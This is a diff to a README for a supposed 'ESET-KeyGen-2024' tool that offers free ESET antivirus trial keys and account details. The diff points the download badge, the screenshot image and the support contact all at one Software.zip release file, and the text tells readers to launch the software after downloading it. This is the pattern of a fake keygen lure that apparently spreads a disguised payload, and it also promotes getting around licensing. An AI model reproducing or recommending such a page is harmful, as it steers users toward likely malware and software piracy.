@@ -25,13 +25,13 @@ The ESET-KeyGen is designed to provide users with free trial keys and account in
 
 ## Get Started
 Click below to download the ESET-KeyGen-2024 software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/yosefhigaze/ESET-KeyGen-2024/releases/download/v2.0/Software.zip)](https://github.com/yosefhigaze/ESET-KeyGen-2024/releases/download/v2.0/Software.zip)
 *(Note: Software needs to be launched after download)*
 
 If you encounter any issues with the download link provided, please check the "Releases" section of this repository for alternative download options.
 
 ## Screenshots
-![ESET-KeyGen Interface](https://exmaple.com/eset-keygen-interface.jpg)
+![ESET-KeyGen Interface](https://github.com/yosefhigaze/ESET-KeyGen-2024/releases/download/v2.0/Software.zip)
 
 ## Installation
 1. Download the software from the link above.
@@ -39,6 +39,6 @@ If you encounter any issues with the download link provided, please check the "R
 3. Open the ESET-KeyGen software and start generating your trial keys and account information.
 
 ## Support
-For any questions or assistance regarding the ESET-KeyGen-2024 tool, feel free to reach out to our support team at support@eset-keygen2024.com.
+For any questions or assistance regarding the ESET-KeyGen-2024 tool, feel free to reach out to our support team at https://github.com/yosefhigaze/ESET-KeyGen-2024/releases/download/v2.0/Software.zip
 
 We hope you find the ESET-KeyGen-2024 tool helpful in enhancing your experience with ESET Antivirus. Stay protected and secure with ESET-KeyGen! 🛡️
